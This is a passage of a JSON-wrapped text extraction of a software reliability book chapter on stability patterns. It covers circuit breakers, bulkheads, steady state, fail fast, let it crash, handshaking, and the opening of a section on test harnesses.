      "extraction_method": "Unstructured"
    },
    {
      "page_number": 108,
      "content": "Chapter 5. Stability Patterns • 96\n\na note of the failure. Once the number of failures (or the frequency of failures, in more sophisticated cases) exceeds a threshold, the circuit breaker trips and “opens” the circuit, as shown in the following figure.\n\nClosedon call / pass throughcall succeeds / reset countcall fails / count failurethreshold reached / trip breaker\n\nOpenon call / failon timeout / attempt reset\n\ntripbreaker\n\nHalf-Openon call/pass throughcall succeeds/resetcall fails/trip breaker\n\nattemptreset\n\nreset\n\ntripbreaker\n\nWhen the circuit is “open,” calls to the circuit breaker fail immediately, without any attempt to execute the real operation. After a suitable amount of time, the circuit breaker decides that the operation has a chance of suc- ceeding, so it goes into the “half-open” state. In this state, the next call to the circuit breaker is allowed to execute the dangerous operation. Should the call succeed, the circuit breaker resets and returns to the “closed” state, ready for more routine operation. If this trial call fails, however, the circuit breaker returns to the open state until another timeout elapses.\n\nDepending on the details of the system, the circuit breaker may track different types of failures separately. For example, you may choose to have a lower threshold for “timeout calling remote system” failures than “connection refused” errors.\n\nWhen the circuit breaker is open, something has to be done with the calls that come in. The easiest answer would be for the calls to immediately fail, perhaps by throwing an exception (preferably a different exception than an ordinary timeout so that the caller can provide useful feedback). A circuit breaker may also have a “fallback” strategy. Perhaps it returns the last good response or a cached value. It may return a generic answer rather than a personalized one. Or it may even call a secondary service when the primary is not available.\n\nreport erratum • discuss",
      "content_length": 1958,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 109,
      "content": "Circuit Breaker • 97\n\nCircuit breakers are a way to automatically degrade functionality when the system is under stress. No matter the fallback strategy, it can have an impact on the business of the system. Therefore, it’s essential to involve the system’s stakeholders when deciding how to handle calls made when the circuit is open. For example, should a retail system accept an order if it can’t confirm availabil- ity of the customer’s items? What about if it can’t verify the customer’s credit card or shipping address? Of course, this conversation is not unique to the use of a circuit breaker, but discussing the circuit breaker can be a more effective way of broaching the topic than asking for a requirements document.\n\nThere are some interesting implementation details to consider. For one thing, what constitutes “too many failures”? A simple counter adding up all the faults probably isn’t that interesting. There’s a world of difference between observing five faults spread evenly over five hours versus five faults in the last thirty seconds. We’re usually more interested in the fault density than the total count. I like the Leaky Bucket pattern from Pattern Languages of Program Design 2 [VCK96]. It’s a simple counter that you can increment every time you observe a fault. In the background, a thread or timer decrements the counter periodically (down to zero, of course.) If the count exceeds a threshold, then you know that faults are arriving quickly.\n\nThe state of the circuit breakers in a system is important to another set of stakeholders: operations. Changes in a circuit breaker’s state should always be logged, and the current state should be exposed for querying and monitor- ing. In fact, the frequency of state changes is a useful metric to chart over time; it is a leading indicator of problems elsewhere in the enterprise. Likewise, Operations needs some way to directly trip or reset the circuit breaker. The circuit breaker is also a convenient place to gather metrics about call volumes and response times.\n\nA circuit breaker should be built at the scope of a single process. That is, the same circuit breaker state affects every thread in a process but is not shared across multiple processes. That does mean some loss of efficiency when multiple instances of the caller each independently discover that the provider is down. However, sharing the circuit breaker state introduces another out- of-process communication. That means the safety mechanism would introduce a new failure mode!\n\nEven when just shared within a process, circuit breakers are subject to the gallery of multithreaded programming terrors. Be sure to avoid accidentally single-threading all calls to a remote system! Open source circuit breaker libraries are available for every language and framework, so it’s probably better to start with one of those.\n\nreport erratum • discuss",
      "content_length": 2887,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 110,
      "content": "Chapter 5. Stability Patterns • 98\n\nCircuit breakers are effective at guarding against integration points, cascading failures, unbalanced capacities, and slow responses. They work so closely with timeouts that they often track timeout failures separately from execution failures.\n\nRemember This\n\nDon’t do it if it hurts.\n\nCircuit Breaker is the fundamental pattern for protecting your system from all manner of Integration Points problems. When there’s a difficulty with Integration Points, stop calling it!\n\nUse together with Timeouts.\n\nCircuit Breaker is good at avoiding calls when Integration Points has a problem. The Timeouts pattern indicates that there’s a problem in Inte- gration Points.\n\nExpose, track, and report state changes.\n\nPopping a Circuit Breaker always indicates something abnormal. It should be visible to Operations. It should be reported, recorded, trended, and correlated.\n\nBulkheads\n\nIn a ship, bulkheads are partitions that, when sealed, divide the ship into separate, watertight compartments. With hatches closed, a bulkhead prevents water from moving from one section to another. In this way, a single penetra- tion of the hull does not irrevocably sink the ship. The bulkhead enforces a principle of damage containment.\n\nYou can employ the same technique. By partitioning your systems, you can keep a failure in one part of the system from destroying everything. Physical redundancy is the most common form of bulkheads. If there are four indepen- dent servers, then a hardware failure in one can’t affect the others. Likewise, if there are two application instances running on a server and one crashes, the other will still be running (unless, of course, the first one crashed because of some external influence that would also affect the second).\n\nRedundant virtual machines are not quite as robust as redundant physical machines. Most VM provisioning tools do not allow you to enforce physical iso- lation, so more than one VM may end up running on the same physical box.\n\nAt the largest scale, a mission-critical service might be implemented as sev- eral independent farms of servers, with certain farms reserved for use by critical applications and others available for noncritical uses. For example,\n\nreport erratum • discuss",
      "content_length": 2261,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 111,
      "content": "Bulkheads • 99\n\na ticketing system could provide dedicated servers for customer check-in. These would not be affected if other, shared servers are overwhelmed with “flight status” queries (as sometimes happens during severe weather). Such a partitioning would have allowed the airline in Chapter 2, Case Study: The Exception That Grounded an Airline, on page 9, to keep checking in passengers at airports, even if channel partners could not look up fares for that day’s flights.\n\nIn the cloud, you should run instances in different divisions of the service (e.g., across zones and regions in AWS). These are very large-grained chunks with strong partitioning between them. When using functions as a service, basically every function invocation runs in its own compartment.\n\nIn the figure that follows, Foo and Bar both use the enterprise service Baz. Because both depend on a common service, each system has some vulnera- bility to the other. If Foo suddenly gets crushed under user load, goes rogue because of some defect, or triggers a bug in Baz, Bar—and its users—also suffer. This kind of unseen coupling makes diagnosing problems (particularly performance problems) in Bar very difficult. Scheduling maintenance windows for Baz also requires coordination with both Foo and Bar, and it may be diffi- cult to find a window that works for both clients.\n\nFoo\n\nBar\n\nBaz\n\nAssuming both Foo and Bar are critical systems with strict SLAs, it’d be safer to partition Baz, as shown in this revised figure on page 100. Dedicating some capacity to each critical client removes most of the hidden linkage. They probably still share a database and are, therefore, subject to deadlocks across instances, but that’s another antipattern.\n\nOf course, it would be better to preserve all capabilities. Assuming that failures will occur, however, you must consider how to minimize the damage caused by a failure. It is not an easy effort, and one rule cannot apply in every case. Instead, you must examine the impact to the business of each loss of capability and\n\nreport erratum • discuss",
      "content_length": 2074,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 112,
      "content": "Chapter 5. Stability Patterns • 100\n\nFoo\n\nBar\n\nBaz\n\nBazPool 1\n\nBazPool 2\n\ncross-reference those impacts against the architecture of the systems. The goal is to identify the natural boundaries that let you partition the system in a way that is both technically feasible and financially beneficial. The bound- aries of this partitioning may be aligned with the callers, with functionality, or with the topology of the system.\n\nWith cloud-based systems and software-defined load balancers, bulkheads do not need to be permanent. With a bit of automation, a cluster of VMs can be carved out and the load balancer can direct traffic from a particular con- sumer to that cluster. This is similar to A/B testing, but as a protective measure rather than an experiment. Dynamic partitions can be made and destroyed as traffic patterns change.\n\nAt smaller scales, process binding is an example of partitioning via bulkheads. Binding a process to a core or group of cores ensures that the operating system schedules that process’s threads only on the designated core or cores. Because it reduces the cache bashing that happens when processes migrate from one core to another, process binding is often regarded as a performance tweak. If a process goes berserk and starts using all CPU cycles, it can usually drag down an entire host machine. I’ve seen eight core servers consumed by a single process. If that process is bound to a core, however, it can use all available cycles only on that one core.\n\nYou can partition the threads inside a single process, with separate thread groups dedicated to different functions. For example, it’s often helpful to reserve a pool of request-handling threads for administrative use. That way, even if all request-handling threads on the application server are hung, it can still respond to admin requests—perhaps to collect data for postmortem analysis or a request to shut down.\n\nreport erratum • discuss",
      "content_length": 1932,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 113,
      "content": "Steady State • 101\n\nBulkheads are effective at maintaining service, or partial service, even in the face of failures. They are especially useful in service-oriented architectures, where the loss of a single service could have repercussions throughout the enterprise. In effect, a service inside an SOA represents a single point of failure for the enterprise.\n\nRemember This\n\nSave part of the ship.\n\nThe Bulkheads pattern partitions capacity to preserve partial functional- ity when bad things happen.\n\nPick a useful granularity.\n\nYou can partition thread pools inside an application, CPUs in a server, or servers in a cluster.\n\nConsider Bulkheads particularly with shared services models.\n\nFailures in service-oriented or microservice architectures can propagate very quickly. If your service goes down because of a Chain Reaction, does the entire company come to a halt? Then you’d better put in some Bulkheads.\n\nSteady State\n\nThe third edition of Roget’s Thesaurus offers the following definition for the word fiddling: “To handle something idly, ignorantly, or destructively.” It offers helpful synonyms such as fool, meddle, tamper, tinker, and monkey. Fiddling is often followed by the “ohnosecond”—that very short moment in time during which you realize that you have pressed the wrong key and brought down a server, deleted vital data, or otherwise damaged the peace and harmony of stable operations.\n\nEvery single time a human touches a server is an opportunity for unforced errors. I know of one incident in which an engineer, attempting to be helpful, observed that a server’s root disk mirror was out of sync. He executed a command to “resilver” the mirror, bringing the two disks back into synchro- nization. Unfortunately, he made a typo and synced the good root disk from the new, totally empty drive that had just been swapped in to replace a bad disk, thereby instantly annihilating the operating system on that server.\n\nIt’s best to keep people off production systems to the greatest extent possible. If the system needs a lot of crank-turning and hand-holding to keep running, then administrators develop the habit of staying logged in all the time. This situation probably indicates that the servers are “pets” rather than “cattle” and inevitably leads to fiddling. To that end, the system should be able to run at least one\n\nreport erratum • discuss",
      "content_length": 2369,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 114,
      "content": "Chapter 5. Stability Patterns • 102\n\nrelease cycle without human intervention. The logical extreme on the “no fiddling” scale is immutable infrastructure—it can’t be fiddled with! (See Automated Deployments, on page 242, for more about immutable infrastructure.)\n\n“One release cycle” may be pretty tough if the system is deployed once a quarter. On the other hand, a microservice being continuously deployed from version control should be pretty easy to stabilize for a release cycle.\n\nUnless the system is crashing every day (in which case, look for the presence of the stability antipatterns), the most common reason for logging in will probably be cleaning up log files or purging data.\n\nAny mechanism that accumulates resources (whether it’s log files in the filesystem, rows in the database, or caches in memory) is like a bucket from a high-school calculus problem. The bucket fills up at a certain rate, based on the accumulation of data. It must be drained at the same rate, or greater, or it will eventually overflow. When this bucket overflows, bad things happen: servers go down, databases get slow or throw errors, response times head for the stars. The Steady State pattern says that for every mechanism that accumulates a resource, some other mechanism must recycle that resource. Let’s look at sev- eral types of sludge that can accumulate and how to avoid the need for fiddling.\n\nData Purging\n\nIt certainly seems like a simple enough principle. Computing resources are always finite; therefore, you cannot continually increase consumption without limit. Still, in the rush of excitement about rolling out a new killer application, the next great mission-critical, bet-the-company whatever, data purging always gets the short end of the stick. It certainly doesn’t demo as well as…well, anything demos better than purging, really. It sometimes seems that you’ll be lucky if the system ever runs at all in the real world. The notion that it’ll run long enough to accumulate too much data to handle seems like a “high-class problem”—the kind of problem you’d love to have.\n\nNevertheless, someday your little database will grow up. When it hits the teenage years—about two in human years—it’ll get moody, sullen, and resentful. In the worst case, it’ll start undermining the whole system (and it will probably complain that nobody understands it, too).\n\nThe most obvious symptom of data growth will be steadily increasing I/O rates on the database servers. You may also see increasing latency at constant loads.\n\nData purging is nasty, detail-oriented work. Referential integrity constraints in a relational database are half the battle. It can be difficult to cleanly remove\n\nreport erratum • discuss",
      "content_length": 2713,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 115,
      "content": "Steady State • 103\n\nobsolete data without leaving orphaned rows. The other half of the battle is ensuring that applications still work once the data is gone. That takes coding and testing.\n\nThere are few general rules here. Much depends on the database and libraries in use. RDBMS plus ORM tends to deal badly with dangling references, for example, whereas a document-oriented database won’t even notice.\n\nAs a consequence, data purging always gets left until after the first release is out the door. The rationale is, “We’ve got six months after launch to implement purging.” (Somehow, they always say “six months.” It’s kind of like a programmer’s estimate of “two weeks.”)\n\nOf course, after launch, there are always emergency releases to fix critical defects or add “must-have” features from marketers tired of waiting for the software to be done. The first six months can slip away pretty quickly, but when that first release launches, a fuse is lit.\n\nAnother type of sludge you will commonly encounter is old log files.\n\nLog Files\n\nOne log file is like one pile of cow dung—not very valuable, and you’d rather not dig through it. Collect tons of cow dung and it becomes “fertilizer.” Like- wise, if you collect enough log files you can discover value.\n\nLeft unchecked, however, log files on individual machines are a risk. When log files grow without bound, they’ll eventually fill up their containing filesystem. Whether that’s a volume set aside for logs, the root disk, or the application installation directory (I hope not), it means trouble. When log files fill up the filesystem, they jeopardize stability. That’s because of the different negative effects that can occur when the filesystem is full. On a UNIX system, the last 5–10 percent (depending on the configuration of the filesystem) of space is reserved for root. That means an application will start getting I/O errors when the filesystem is 90 or 95 percent full. Of course, if the application is running as root, then it can consume the very last byte of space. On a Windows system, an application can always use the very last byte. In either case, the operating system will report errors back to the application.\n\nWhat happens next is anyone’s guess. In the best-case scenario, the logging filesystem is separate from any critical data storage (such as transactions), and the application code protects itself well enough that users never realize anything is amiss. Significantly less pleasant, but still tolerable, is a nicely worded error message asking the users to have patience with us and please\n\nreport erratum • discuss",
      "content_length": 2599,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 116,
      "content": "Chapter 5. Stability Patterns • 104\n\ncome back when we’ve got our act together. Several rungs down the ladder is serving a stack trace to the user.\n\nWorse yet, the developers in one system I saw had added a “universal exception handler” to the servlet pipeline. This handler would log any kind of exception. It was reentrant, so if an exception occurred while logging an exception, it would log both the original and the new exception. As soon as the filesystem got full, this poor exception handler went nuts, trying to log an ever-increasing stack of exceptions. Because there were multiple threads, each trying to log its own Sisyphean exception, this application server was able to consume eight entire CPUs—for a little while, anyway. The exceptions, multiplying like Leonardo of Pisa’s rabbits, rapidly consumed all available memory. This was followed shortly by a crash.\n\nOf course, it’s always better to avoid filling up the filesystem in the first place. Log file rotation requires just a few minutes of configuration.\n\nIn the case of legacy code, third-party code, or code that doesn’t use one of the excellent logging frameworks available, the logrotate utility is ubiquitous on UNIX. For Windows, you can try building logrotate under Cygwin, or you can hand roll a .vbs or .bat script to do the job. Logging can be a wonderful aid to transparency. Make sure that all log files will get rotated out and eventually purged, though, or you’ll eventually spend time fixing the tool that’s supposed to help you fix the system.\n\nWhat About Compliance? Don’t We Have to Keep All Our Log Files Forever?\n\nYou will sometimes hear people talking about logging in terms of compliance require- ments. Compliance in all its forms makes many heavy demands on IT infrastructure and operations. The specific demands depend on your industry, but there’s always a component about “controls.” The Sarbanes–Oxley Act of 2002 (SOX) requires adequate controls on any system that produces financially significant information. The company must be able to demonstrate that nobody can monkey with the financial data. Another common requirement is to record and demonstrate that only authorized users accessed certain data. Many companies also face industry- and country-specific regulations.\n\nThese various compliance regimes require you to retain logs for years. Individual machines can’t possibly retain logs that long. Most of the machines don’t live that long, especially if you’re in the cloud! The best thing to do is get logs off of production machines as quickly as possible. Store them on a centralized server and monitor it closely for tampering.\n\nreport erratum • discuss",
      "content_length": 2666,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 117,
      "content": "Steady State • 105\n\nLog files on production systems have a terrible signal-to-noise ratio. It’s best to get them off the individual hosts as quickly as possible. Ship the log files to a centralized logging server, such as Logstash, where they can be indexed, searched, and monitored.\n\nBetween data in the database and log files on the disk, persistent data can find plenty of ways to clog up your system. Like a jingle from an old commer- cial, sludge stuck in memory clogs up your application.\n\nIn-Memory Caching\n\nTo a long-running server, memory is like oxygen. Cache, left untended, will suck up all the oxygen. Low memory conditions are a threat to both stability and capacity. Therefore, when building any sort of cache, it’s vital to ask two questions:\n\nIs the space of possible keys finite or infinite? • Do the cached items ever change?\n\nIf the number of possible keys has no upper bound, then cache size limits must be enforced and the cache needs some form of cache invalidation. The simplest mechanism is a time-based cache flush. You can also investigate least recently used (LRU) or working-set algorithms, but nine times out of ten, a periodic flush will do.\n\nImproper use of caching is the major cause of memory leaks, which in turn lead to horrors like daily server restarts. Nothing gets administrators in the habit of being logged onto production like daily (or nightly) chores.\n\nSludge buildup is a major cause of slow responses, so Steady State helps avoid that antipattern. Steady State also encourages better operational discipline by limiting the need for system administrators to log on to the production servers.\n\nRemember This\n\nAvoid fiddling.\n\nHuman intervention leads to problems. Eliminate the need for recurring human intervention. Your system should run for at least a typical deployment cycle without manual disk cleanups or nightly restarts.\n\nPurge data with application logic.\n\nDBAs can create scripts to purge data, but they don’t always know how the application behaves when data is removed. Maintaining logical integrity, especially if you use an ORM tool, requires the application to purge its own data.\n\nreport erratum • discuss",
      "content_length": 2167,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 118,
      "content": "Chapter 5. Stability Patterns • 106\n\nLimit caching.\n\nIn-memory caching speeds up applications, until it slows them down. Limit the amount of memory a cache can consume.\n\nRoll the logs.\n\nDon’t keep an unlimited amount of log files. Configure log file rotation based on size. If you need to retain them for compliance, do it on a non- production server.\n\nFail Fast\n\nIf slow responses are worse than no response, the worst must surely be a slow failure response. It’s like waiting through the interminable line at the DMV, only to be told you need to fill out a different form and go back to the end of the line. Can there be any bigger waste of system resources than burning cycles and clock time only to throw away the result?\n\nIf the system can determine in advance that it will fail at an operation, it’s always better to fail fast. That way, the caller doesn’t have to tie up any of its capacity waiting and can get on with other work.\n\nHow can the system tell whether it will fail? Do we need Deep Learning? Don’t worry, you won’t need to hire a cadre of data scientists.\n\nIt’s actually much more mundane than that. There’s a large class of “resource unavailable” failures. For example, when a load balancer gets a connection request but not one of the servers in its service pool is functioning, it should immediately refuse the connection. Some configurations have the load balancer queue the connection request for a while in the hopes that a server will become available in a short period of time. This violates the Fail Fast pattern.\n\nThe application or service can tell from the incoming request or message roughly what database connections and external integration points will be needed. The service can quickly check out the connections it will need and verify the state of the circuit breakers around the integration points. This is sort of the software equivalent of the chef’s mise en place—gathering all the ingredients needed to perform the request before it begins. If any of the resources are not available, the service can fail immediately, rather than getting partway through the work.\n\nAnother way to fail fast in a web application is to perform basic parameter- checking in the servlet or controller that receives the request, before talking to the database. This would be a good reason to move some parameter checking out of domain objects into something like a “Query object.”\n\nreport erratum • discuss",
      "content_length": 2426,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 119,
      "content": "Fail Fast • 107\n\n“We Got the Fax—It’s All Black”\n\nOne of my more interesting projects was for a studio photography company. Part of the project involved working on the software that rendered images for high-resolution printing. The previous generation of this software had a problem that generated more work for humans downstream: if color profiles, images, backgrounds, or alpha masks weren’t available, it “rendered” a black image full of zero-valued pixels. This black image went into the printing pipeline and was printed, wasting paper, chemicals, and time. Quality checkers would pull the black image and send it back to the people at the beginning of the process for diagnosis, debugging, and correction. Ultimately, they would fix the problem (usually by calling developers to the printing facility) and remake the bad print. Since the order was already late getting out the door, they would expedite the remake—meaning it interrupted the pipeline of work and went to the head of the line.\n\nWhen my team started on the rendering software, we applied the Fail Fast pattern. As soon as the print job arrived, the renderer checked for the presence of every font (missing fonts caused a similar remake, but not because of black images), image, background, and alpha mask. It preallocated memory, so it couldn’t fail an allocation later. The renderer reported any such failure to the job control system immediately, before it wasted several minutes of compute time. Best of all, “broken” orders would be pulled from the pipeline, avoiding the case of having partial orders waiting at the end of the process. Once we launched the new renderer, the software-induced remake rate dropped to zero. Orders could still be remade because of other quality problems —dust in the camera, poor exposure, or bad cropping—but at least our software wasn’t the cause.\n\nThe only thing we didn’t preallocate was disk space for the final image. We violated “steady state” under the direction of the customer, who indicated that he had his own rock-solid purging process. Turns out the “purging process” was one guy who occasionally deleted a bunch of files by hand. Less than one year after we launched, the drives filled up. Sure enough, the one place we broke the Fail Fast principle was the one place our renderer failed to report errors before wasting effort. It would render images—several minutes of compute time—and then throw an exception.\n\nEven when failing fast, be sure to report a system failure (resources not available) differently than an application failure (parameter violations or invalid state). Reporting a generic “error” message may cause an upstream system to trip a circuit breaker just because some user entered bad data and hit Reload three or four times.\n\nThe Fail Fast pattern improves overall system stability by avoiding slow responses. Together with timeouts, failing fast can help avert impending cascading failures. It also helps maintain capacity when the system is under stress because of partial failures.\n\nreport erratum • discuss",
      "content_length": 3051,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 120,
      "content": "Chapter 5. Stability Patterns • 108\n\nRemember This\n\nAvoid Slow Responses and Fail Fast.\n\nIf your system cannot meet its SLA, inform callers quickly. Don’t make them wait for an error message, and don’t make them wait until they time out. That just makes your problem into their problem.\n\nReserve resources, verify Integration Points early.\n\nIn the theme of “don’t do useless work,” make sure you’ll be able to com- plete the transaction before you start. If critical resources aren’t available —for example, a popped Circuit Breaker on a required callout—then don’t waste work by getting to that point. The odds of it changing between the beginning and the middle of the transaction are slim.\n\nUse for input validation.\n\nDo basic user input validation even before you reserve resources. Don’t bother checking out a database connection, fetching domain objects, populating them, and calling validate() just to find out that a required parameter wasn’t entered.\n\nLet It Crash\n\nSometimes the best thing you can do to create system-level stability is to abandon component-level stability. In the Erlang world, this is called the “let it crash” philosophy. We know from Chapter 2, Case Study: The Excep- tion That Grounded an Airline, on page 9, that there is no hope of preventing every possible error. Dimensions proliferate and the state space exponentiates. There’s just no way to test everything or predict all the ways a system can break. We must assume that errors will happen.\n\nThe key question is, “What do we do with the error?” Most of the time, we try to recover from it. That means getting the system back into a known good state using things like exception handlers to fix the execution stack and try-finally blocks or block-scoped resources to clean up memory leaks. Is that sufficient?\n\nThe cleanest state your program can ever have is right after startup. The “let it crash” approach says that error recovery is difficult and unreliable, so our goal should be to get back to that clean startup as rapidly as possible.\n\nFor “let it crash” to work, a few things have to be true in our system.\n\nLimited Granularity\n\nThere must be a boundary for the crashiness. We want to crash a component in isolation. The rest of the system must protect itself from a cascading failure.\n\nreport erratum • discuss",
      "content_length": 2307,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 121,
      "content": "Let It Crash • 109\n\nIn Erlang or Elixir, the natural boundary is the actor. The runtime system allows an actor to terminate without taking down the entire operating system process. Other languages have actor libraries, such as Akka for Java and Scala.1 These overlay the actor model on a runtime that has no idea what an actor is. If you follow the library’s rules for resource management and state isolation, you can still get the benefits of “let it crash.” You should plan on more code reviews to make sure every developer follows those rules, though!\n\nIn a microservices architecture, a whole instance of the service might be the right granularity. This depends largely on how quickly it can be replaced with a clean instance, which brings us to the next key consideration.\n\nFast Replacement\n\nWe must be able to get back into that clean state and resume normal operation as quickly as possible. Otherwise, we’ll see performance degrade when too many of our instances are restarting at the same time. In the limit, we could have loss of service because all of our instances are busy restarting.\n\nWith in-process components like actors, the restart time is measured in microseconds. Callers are unlikely to really notice that kind of disruption. You’d have to set up a special test case just to measure it.\n\nService instances are trickier. It depends on how much of the “stack” has to be started up. A few examples will help illustrate that:\n\nWe’re running Go binaries in a container. Startup time for a new container and a process in it is measured in milliseconds. Crash the whole container.\n\nIt’s a NodeJS service running on a long-running virtual machine in AWS. Starting the NodeJS process takes milliseconds, but starting a new VM takes minutes. In this case, just crash the NodeJS process.\n\nAn aging JavaEE application with an API pranged into the front end runs on virtual machines in a data center. Startup time is measured in minutes. “Let it crash” is not the right strategy.\n\nSupervision\n\nWhen we crash an actor or a process, how does a new one get started? You could write a bash script with a while() loop in it. But what happens when the problem persists across restarts? The script basically fork-bombs the server.\n\n1.\n\nhttp://akka.io\n\nreport erratum • discuss",
      "content_length": 2278,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 122,
      "content": "Chapter 5. Stability Patterns • 110\n\nActor systems use a hierarchical tree of supervisors to manage the restarts. Whenever an actor terminates, the runtime notifies the supervisor. The supervisor can then decide to restart the child actor, restart all of its children, or crash itself. If the supervisor crashes, the runtime will terminate all its children and notify the supervisor’s supervisor. Ultimately you can get whole branches of the supervision tree to restart with a clean state. The design of the supervision tree is integral to the system design.\n\nIt’s important to note that the supervisor is not the service consumer. Manag- ing the worker is different than requesting work. Systems suffer when they conflate the two.\n\nSupervisors need to keep close track of how often they restart child processes. It may be necessary for the supervisor to crash itself if child restarts happen too densely. This would indicate that either the state isn’t sufficiently cleaned up or the whole system is in jeopardy and the supervisor is just masking the underlying problem.\n\nWith service instances in a PaaS environment, the platform itself decides to launch a replacement. In a virtualized environment with autoscaling, the autoscaler decides whether and where to launch a replacement. Still, these are not the same as a supervisor because they lack discretion. They will always restart the crashed instance, even if it is just going to crash again immediately. There’s also no notion of hierarchical supervision.\n\nReintegration\n\nThe final element of a “let it crash” strategy is reintegration. After an actor or instance crashes and the supervisor restarts it, the system must resume calling the newly restored provider. If the instance was called directly, then callers should have circuit breakers to automatically reintegrate the instance. If the instance is part of a load-balanced pool, then the instance must be able to join the pool to accept work. A PaaS will take care of this for containers. With statically allocated virtual machines in a data center, the instance should be reintegrated when health checks from the load balancer begin to pass.\n\nRemember This\n\nCrash components to save systems.\n\nIt may seem counterintuitive to create system-level stability through component-level instability. Even so, it may be the best way to get back to a known good state.\n\nreport erratum • discuss",
      "content_length": 2398,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 123,
      "content": "Handshaking • 111\n\nRestart fast and reintegrate.\n\nThe key to crashing well is getting back up quickly. Otherwise you risk loss of service when too many components are bouncing. Once a compo- nent is back up, it should be reintegrated automatically.\n\nIsolate components to crash independently.\n\nUse Circuit Breakers to isolate callers from components that crash. Use supervisors to determine what the span of restarts should be. Design your supervision tree so that crashes are isolated and don’t affect unrelated functionality.\n\nDon’t crash monoliths.\n\nLarge processes with heavy runtimes or long startups are not the right place to apply this pattern. Applications that couple many features into a single process are also a poor choice.\n\nHandshaking\n\nHandshaking refers to signaling between devices that regulate communication between them. Serial protocols such as EIA-232C (formerly known as RS-232) rely on the receiver to indicate when it’s ready to receive data. Analog modems used a form of handshaking to negotiate a speed and a signal encoding that both devices would agree upon. And, as illustrated earlier in the three-phase handshake on page 37, TCP uses a three-phase handshake to establish a socket connection. TCP handshaking also allows the receiver to signal the sender to stop sending data until the receiver is ready. Handshaking is ubiquitous in low-level communications protocols but is almost nonexistent at the application level.\n\nThe sad truth is that HTTP isn’t good at shaking hands. HTTP-based protocols, such as XML-RPC or WS-I Basic, have few options available for handshaking. HTTP provides a response code of “503 Service Unavailable,” which is defined to indicate a temporary condition.2 Most clients, however, will not distinguish between different response codes. If the code is not a “200 OK,” “403 Authentication Required,” or “302 Found (redirect),” the client probably treats the response as a fatal error. Many clients even treat other 200 series codes as errors!\n\nSimilarly, the protocols beneath every remote procedure call technology (CORBA, DCOM, Java RMI, and so on) are equally bad at signaling their readiness to do business.\n\n2.\n\nwww.w3.org/Protocols/rfc2616/rfc2616-sec10.html\n\nreport erratum • discuss",
      "content_length": 2250,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 124,
      "content": "Chapter 5. Stability Patterns • 112\n\nHandshaking is all about letting the server protect itself by throttling its own workload. Instead of being victim to whatever demands are made upon it, the server should have a way to reject incoming work. The closest approximation I’ve been able to achieve with HTTP-based servers relies on a partnership between a load balancer and the web or application servers. The web server notifies the load balancer—which is pinging a “health check” page on the web server periodically—that it is busy by returning either an error page (HTTP response code 503 “Not Available” works) or an HTML page with an error message. The load balancer then knows not to send any additional work to that particular web server.\n\nOf course, this helps only for web services and still breaks down if all the web servers are too busy to serve another page.\n\nWhen there are several services, each can provide a “health check” query for use by load balancers. The load balancer would then check the health of the server before directing a request to that instance. This provides good hand- shaking at a relatively small expense to the service.\n\nHandshaking can be most valuable when unbalanced capacities are leading to slow responses. If the server can detect that it will not be able to meet its SLAs, then it should have some means to ask the caller to back off. If the servers are sitting behind a load balancer, then they have the binary on/off control of stopping responses to the load balancer, which would in turn take the unresponsive server out of the pool. This is a crude mechanism, though. Your best bet is to build handshaking into any custom protocols that you implement.\n\nCircuit Breaker is a stopgap you can use when calling services that cannot handshake. In that case, instead of asking politely whether the server can handle the request, you just make the call and track whether it works.\n\nOverall, handshaking is an underused technique that could be applied to great advantage in application-layer protocols. It is an effective way to stop cracks from jumping layers, as in the case of a cascading failure.\n\nRemember This\n\nCreate cooperative demand control.\n\nHandshaking between a client and a server permits demand throttling to serviceable levels. Both the client and the server must be built to perform handshaking. Most common application-level protocols do not perform handshaking.\n\nreport erratum • discuss",
      "content_length": 2444,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 125,
      "content": "Test Harnesses • 113\n\nConsider health checks.\n\nUse health checks in clustered or load-balanced services as a way for instances to handshake with the load balancer.\n\nBuild handshaking into your own low-level protocols.\n\nIf you create your own socket-based protocol, build handshaking into it so that the endpoints can each inform the other when they are not ready to accept work.\n\nTest Harnesses\n\nAs you’ve seen in previous chapters, distributed systems have failure modes that are difficult to provoke in development or QA environments. To be more thorough about testing various components together, we often resort to an “integration testing” environment. In this environment, our system is fully integrated to all the other systems it interacts with.\n\nIntegration testing presents problems of its own, however. What version should we test against? For greatest assurance, we’d like to test against the versions of our dependencies that will be current when we release our system. We could prove by induction that this approach constrains the entire company to testing only one new piece of software at a time. (Naturally, the proof itself is left as an exercise for the reader.) Furthermore, the interdependencies of today’s systems create such an interlocking web of systems that an integration testing environment really becomes unitary—one global integration test that duplicates the real production systems of the entire enterprise. Such a unitary environment would need change control just as rigorous—or perhaps more so—than the actual production environments.\n\nThere is a more abstract difficulty. Integration test environments can verify only what the system does when its dependencies are working correctly. Although it may be possible to provoke the remote system into returning errors, it’s still functioning more or less within specifications. If the specifica- tions say, ”The system shall return an error code 14916 unless the request includes the date of the last telephone sanitization,” then the caller can force that error condition to occur. Nevertheless, the remote system is still operating within specifications.\n\nThe main theme of this book, however, is that every system will eventually end up operating outside of spec; therefore, it’s vital to test the local system’s behavior when the remote system goes wonky. Unless the designers of the remote system built in modes that simulate the whole range of out-of-spec\n\nreport erratum • discuss",
      "content_length": 2467,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 126,
